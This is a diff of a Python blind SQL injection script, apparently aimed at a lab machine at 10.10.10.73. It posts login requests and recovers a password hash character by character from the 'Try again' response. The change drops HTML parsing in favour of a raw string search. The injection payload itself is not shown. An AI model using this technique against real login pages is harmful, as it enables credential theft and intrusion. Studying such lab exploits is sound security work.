@@ -1,6 +1,4 @@
 import requests 
-from bs4 import BeautifulSoup
-from itertools import repeat
 
 loginPage = 'http://10.10.10.73/login.php'
 extractedHash = ''
@@ -16,24 +14,7 @@ while i <= 32 :
         response = requests.post(loginPage,data=parameters)
         # getting the html content from response object
         html =  response.text
-
-        # using html parser
-        soup = BeautifulSoup(html, features="html.parser")
-        # delete all script and style elements
-        for script in soup(["script", "style"]):
-            script.extract()    
-        # get text
-        text = soup.get_text()
-        # break into lines and remove leading and trailing space on each
-        lines = (line.strip() for line in text.splitlines())
-        # break multi-headlines into a line each
-        chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
-        # drop blank lines
-        text = '\n'.join(chunk for chunk in chunks if chunk)
-        # Check BlindSQLi Cases : 
-        # 1 - "Try again" case: is the false case for BlindSQLi (injected the wrong hash char, so we will skip this char) 
-        # 2 - In else case: the application will response with "Wrong identification", which means we used the correct username, and the injected char is used in user password hash , so we will save this char into a variable
-        if (text.find("Try again..") != -1):
+        if (html.find("Try again..") != -1):
             #print("False Case")
             pass
         else:
